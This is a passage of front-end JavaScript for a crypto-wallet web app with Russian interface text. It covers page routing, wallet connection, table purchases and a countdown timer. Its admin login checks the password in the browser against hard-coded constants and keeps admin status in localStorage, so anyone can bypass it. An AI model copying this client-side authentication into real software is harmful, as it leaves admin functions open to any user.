  const path = h.replace(/^\//, "").split("?")[0];
  if (path === "app") return "user";
  if (path === "cabinet") return "cabinet";
  if (path === "rules") return "rules";
  if (path === "admin") return isAdmin ? "admin" : "login";
  return "home";
}

function applyRoute() {
  showScreen(routeFromHash());
  renderAll();
}

// ===== EVENT LISTENERS =====

document.getElementById("headerConnect").addEventListener("click", () => {
  if (connectedWallet) location.hash = "#/cabinet";
  else connectWallet();
});

document.getElementById("loginBtn").addEventListener("click", () => {
  const u = document.getElementById("loginUser").value.trim();
  const p = document.getElementById("loginPass").value;
  if (u === ADMIN_USER && p === ADMIN_PASS) {
    isAdmin = true;
    if (connectedWallet) {
      localStorage.setItem("stoly_admin_" + connectedWallet, "true");
    }
    document.getElementById("loginPass").value = "";
    document.getElementById("loginErr").textContent = "";
    location.hash = "#/admin";
    applyRoute();
    toast("✅ Админ-доступ активирован");
  } else document.getElementById("loginErr").textContent = "Неверный логин или пароль";
});

document.getElementById("loginPass").addEventListener("keydown", (e) => {
  if (e.key === "Enter") document.getElementById("loginBtn").click();
});

document.getElementById("logoutBtn").addEventListener("click", () => {
  isAdmin = false;
  if (connectedWallet) {
    localStorage.removeItem("stoly_admin_" + connectedWallet);
  }
  location.hash = "#/";
  applyRoute();
  toast("Выход");
});

document.getElementById("connectBtn").addEventListener("click", connectWallet);
document.getElementById("disconnectBtn").addEventListener("click", () => disconnectWallet(false));
document.getElementById("walletModalClose").addEventListener("click", closeWalletModal);
document.getElementById("walletModal").addEventListener("click", (e) => {
  if (e.target.id === "walletModal") closeWalletModal();
});

document.addEventListener("keydown", (e) => {
  if (e.key === "Escape") closeWalletModal();
});

document.getElementById("uBuyBtn").addEventListener("click", () => {
  buy(activeTable);
});

// Timer update interval
setInterval(() => {
  if (mode === "user" || mode === "admin") {
    const timerEl = document.querySelector(".t-timer");
    if (timerEl && TABLE_2_OPEN_TIME_MS) {
      const remaining = TABLE_2_OPEN_TIME_MS - getServerTimeNowMs();
      timerEl.textContent = formatCountdown(remaining);
    }
  }
  if (mode === "user" || mode === "cabinet") renderAll();
}, 1000);

window.addEventListener("hashchange", applyRoute);

window.addEventListener("load", async () => {
  await initializeServerTime();
  
  if (initializeWeb3()) {
    await restoreWallet();
  }
  applyRoute();
});
